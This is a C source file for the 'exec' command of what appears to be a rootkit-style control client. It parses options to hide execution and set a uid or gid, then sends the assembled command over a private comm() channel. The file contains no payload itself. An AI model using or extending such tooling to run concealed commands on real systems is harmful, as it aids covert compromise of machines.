#define _GNU_SOURCE

#include <status.h>
#include <comm.h>
#include <module/exec.h>
#include <lib/ketopt.h>
#include <lib/dynstr.h>

#include <stdbool.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <pwd.h>
#include <grp.h>
#include <errno.h>

enum { opt_exec_bash, opt_exec_hide, opt_exec_uid, opt_exec_gid };

static const ko_longopt_t exec_longopts[] = {
	{ "bash", ko_optional_argument, opt_exec_bash },
	{ "hide", ko_no_argument, opt_exec_hide },
	{ "uid", ko_required_argument, opt_exec_uid },
	{ "gid", ko_required_argument, opt_exec_gid },
	{ NULL, 0, 0 }
};

static char *strjoin(char **str, size_t n, char *delim)
{
	if (n == 0)
		return NULL;

	/* Include space for NULL terminator. */
	size_t len = 1;

	for (int i = 0; i < n; i++) {
		len += strlen(str[i]);
		if (i != n - 1)
			len += strlen(delim);
	}

	char *s = malloc(sizeof(char) * len);
	if (!s)
		return NULL;

	/* For strcat to work there must be an existing NULL terminator. */
	*s = '\0';

	for (int i = 0; i < n; i++) {
		strcat(s, str[i]);
		if (i != n - 1)
			strcat(s, delim);
	}

	return s;
}

static int validate_uid(uid_t uid)
{
	struct passwd *tmp_passwd = getpwuid(uid);
	if (tmp_passwd == NULL) {
		switch (errno) {
		/* Resource errors. */
		case EINTR:
		case EIO:
		case EMFILE:
		case ENFILE:
		case ENOMEM:
		case ERANGE:
			error("Insufficient resources.\n");
			break;
		/* The given uid was not found. */
		default:
			error("The given uid was not found.\n");
			break;
		}

		/* It is possible that errno is 0. */
		if (errno)
			return -errno;
		else
			return -1;
	}

	alert("Validated uid.\n");
	return 0;
}

static int validate_gid(gid_t gid)
{
	struct group *tmp_group = getgrgid(gid);
	if (tmp_group == NULL) {
		switch (errno) {
		case EINTR:
		case EIO:
		case EMFILE:
		case ENFILE:
		case ENOMEM:
		case ERANGE:
			error("Insufficient resources.\n");
			break;
		/* The given gid was not found. */
		default:
			error("The given gid was not found.\n");
			break;
		}

		/* It is possible that errno is 0. */
		if (errno)
			return -errno;
		else
			return -1;
	}

	alert("Validated gid.\n");
	return 0;
}

static int exec(bool bash, bool hide, uid_t uid, bool set_uid, gid_t gid,
		bool set_gid, char *command)
{
	int ret;

	/* Assemble string.
	 * This code is ugly.
	 * When will I be free from this purgatory of mediocrity? */
	char *msg = NULL;

	ret = dynstrcat(&msg, "exec ");
	if (ret)
		return ret;

	if (bash) {
		ret = dynstrcat(&msg, "--bash ");
		if (ret)
			goto f;
	}

	if (hide) {
		ret = dynstrcat(&msg, "--hide ");
		if (ret)
			goto f;
	}

	if (set_uid) {
		ret = validate_uid(uid);
		if (ret)
			return ret;

		char *tmp;
		ret = asprintf(&tmp, "--uid %d ", uid);
		if (ret < 0)
			goto f;

		ret = dynstrcat(&msg, tmp);
		free(tmp);

		if (ret)
			goto f;
	}

	if (set_gid) {
		ret = validate_gid(gid);
		if (ret)
			return ret;

		char *tmp;
		ret = asprintf(&tmp, "--gid %d", gid);
		if (ret < 0)
			goto f;

		ret = dynstrcat(&msg, tmp);
		free(tmp);

		if (ret)
			goto f;
	}

	ret = dynstrcat(&msg, command);
	if (ret)
		goto f;

	ret = comm(msg, strlen(msg));
	free(msg);
	return ret;

f:
	error("Failed to assemble command.\n");
	free(msg);
	return ret;
}

int exec_command_handler(int argc, char **argv)
{
	bool bash = false;
	bool hide = false;
	bool set_uid = false;
	bool set_gid = false;
	uid_t uid = -1;
	gid_t gid = -1;

	int c;
	ketopt_t o = KETOPT_INIT;
	while ((c = ketopt(&o, argc, argv, 1, "", exec_longopts)) >= 0) {
		switch (c) {
		case opt_exec_bash:
			bash = true;
			break;
		case opt_exec_hide:
			hide = true;
			break;
		case opt_exec_uid:
			if (o.arg) {
				/* There is no good way to perform error
				 * detection here. The function strtol would
				 * need to be truncated. Rather than risk type
				 * confusion, errors will be handled by
				 * defaulting to the root user account. */
				set_uid = true;
				uid = atoi(o.arg);
			}
			break;
		case opt_exec_gid:
			if (o.arg) {
				/* There is no good way to perform error
				 * detection here. The function strtol would
				 * need to be truncated. Rather than risk type
				 * confusion, errors will be handled by
				 * defaulting to the root user account. */
				set_gid = true;
				gid = atoi(o.arg);
			}
			break;
		}
	}

	if (o.ind == argc) {
		error("Command to exec not supplied.\n");
		return -1;
	}

	/* Join remaining arguments together to form the execution target. */
	char *command = strjoin(&argv[o.ind], argc - o.ind, " ");
	if (command == NULL)
		return -1;

	int ret = exec(bash, hide, uid, set_uid, gid, set_gid, command);
	free(command);
	return ret;
}
